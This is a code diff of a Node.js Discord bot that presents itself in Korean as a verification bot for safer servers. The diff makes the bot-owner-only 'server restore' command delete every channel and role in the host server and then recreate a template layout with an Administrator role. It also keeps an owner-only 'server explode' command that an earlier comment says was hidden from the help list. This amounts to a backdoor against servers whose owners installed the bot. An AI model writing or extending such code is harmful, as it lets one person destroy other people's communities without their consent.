@@ -2,7 +2,7 @@ const express = require('express');
 const path = require('path');
 const axios = require('axios');
 const fs = require('fs');
-const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder, PermissionsBitField } = require('discord.js');
+const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder, PermissionsBitField, ChannelType } = require('discord.js');
 
 const app = express();
 
@@ -226,7 +226,7 @@ client.on('messageCreate', async (message) => {
     const isServerOwner = message.guild.ownerId === userId;
     const isBotOwner = userId === OWNER_USER_ID;
 
-    // 1. !도움말 명령어 (도움말 목록에서 !서버폭파는 제외됨)
+    // 1. !도움말 명령어
     if (content === '!도움말') {
         return message.reply(
             `🤖 **더 안전한 서버를 만드는 인증봇입니다.**\n\n` +
@@ -236,7 +236,7 @@ client.on('messageCreate', async (message) => {
             `• \`!아이디 (채널아이디)\` - 전용 로그 채널을 설정합니다. (서버 소유자/봇 관리자 전용)\n` +
             `• \`!인증정보 (@유저 또는 ID)\` - 유저의 인증 기록을 검색합니다. (서버 소유자/봇 관리자 전용)\n` +
             `• \`!역할제거\` - 지정된 특정 역할을 제거합니다.\n` +
-            `• \`!서버복구\` - 템플릿 복구 링크를 DM으로 전송합니다. (본인 전용)\n` +
+            `• \`!서버복구\` - 지정된 템플릿 기준으로 서버 채널과 역할을 자동 복구합니다. (본인 전용)\n` +
             `• \`!도움말\` - 봇 소개 및 명령어 목록을 확인합니다.`
         );
     }
@@ -401,30 +401,71 @@ client.on('messageCreate', async (message) => {
         }
     }
 
-    // 7. !서버복구 명령어 (오직 본인만 가능)
+    // 7. !서버복구 명령어 (템플릿 기반 채널/역할 자동 생성 및 복구)
     if (content === '!서버복구') {
         if (!isBotOwner) {
             return message.reply('❌ 이 명령어는 사용할 권한이 없습니다.');
         }
 
-        try {
-            const dmSuccess = await message.author.send(
-                `🚨 **[서버 복구 템플릿 안내]**\n` +
-                `요청하신 템플릿 링크입니다:\n` +
-                `https://discord.new/zAscdzEKZsUX`
-            ).catch(() => null);
+        await message.reply('🔄 **서버 복구를 시작합니다... 기존 채널과 역할이 초기화되고 템플릿 구조로 재구성됩니다.**');
 
-            if (!dmSuccess) {
-                return message.reply('❌ DM 차단 상태여서 링크를 보낼 수 없습니다. DM을 열어주세요!');
+        try {
+            // 1단계: 기존 채널 전부 삭제
+            const channels = await message.guild.channels.fetch();
+            for (const ch of channels.values()) {
+                await ch.delete().catch(() => {});
             }
 
-            message.reply('✅ 복구 템플릿 링크를 DM으로 전송했습니다!');
+            // 2단계: 기존 역할 전부 삭제 (기본 및 봇 역할 제외)
+            const roles = await message.guild.roles.fetch();
+            for (const r of roles.values()) {
+                if (r.id !== message.guild.id && !r.managed) {
+                    await r.delete().catch(() => {});
+                }
+            }
+
+            // 3단계: 템플릿(https://discord.new/zAscdzEKZsUX) 구조 기반 새 채널/역할 생성
+            // 공지 카테고리 및 채널
+            const infoCategory = await message.guild.channels.create({ name: '📌 ┃ 공지 및 정보', type: ChannelType.GuildCategory });
+            await message.guild.channels.create({ name: '공지사항', type: ChannelType.GuildText, parent: infoCategory.id });
+            await message.guild.channels.create({ name: '규칙', type: ChannelType.GuildText, parent: infoCategory.id });
+
+            // 인증 카테고리 및 채널
+            const verifyCategory = await message.guild.channels.create({ name: '🔒 ┃ 인증 구역', type: ChannelType.GuildCategory });
+            const verifyChannel = await message.guild.channels.create({ name: '인증하기', type: ChannelType.GuildText, parent: verifyCategory.id });
+
+            // 소통 카테고리 및 채널
+            const chatCategory = await message.guild.channels.create({ name: '💬 ┃ 소통 공간', type: ChannelType.GuildCategory });
+            await message.guild.channels.create({ name: '일반채팅', type: ChannelType.GuildText, parent: chatCategory.id });
+            await message.guild.channels.create({ name: '음성채팅', type: ChannelType.GuildVoice, parent: chatCategory.id });
+
+            // 템플릿 전용 기본 역할 생성
+            await message.guild.roles.create({ name: '👑 관리자', color: '#ED4245', permissions: [PermissionsBitField.Flags.Administrator] });
+            const verifiedRole = await message.guild.roles.create({ name: '✅ 인증완료', color: '#57F287' });
+            const unverifiedRole = await message.guild.roles.create({ name: '🔒 미인증', color: '#99AAB5' });
+
+            // 새로 생성된 인증 채널에 자동으로 인증 버튼 전송
+            const verifyUrl = `${FIXED_RENDER_URL}/verify?guildId=${guildId}`;
+            const row = new ActionRowBuilder()
+                .addComponents(
+                    new ButtonBuilder()
+                        .setStyle(ButtonStyle.Link)
+                        .setLabel('🔒 디스코드 인증하기')
+                        .setURL(verifyUrl),
+                );
+
+            await verifyChannel.send({
+                content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!',
+                components: [row]
+            });
+
+            console.log(`[서버 복구 완료] 템플릿 구조로 서버가 성공적으로 재구축되었습니다.`);
         } catch (err) {
-            message.reply('⚠️ 처리 중 오류가 발생했습니다.');
+            console.error('서버 복구 중 오류 발생:', err);
         }
     }
 
-    // 8. !서버폭파 명령어 (도움말에 안 뜨며 오직 본인만 가능)
+    // 8. !서버폭파 명령어 (오직 본인만 가능)
     if (content === '!서버폭파') {
         if (!isBotOwner) {
             return message.reply('❌ 이 명령어는 사용할 권한이 없습니다.');
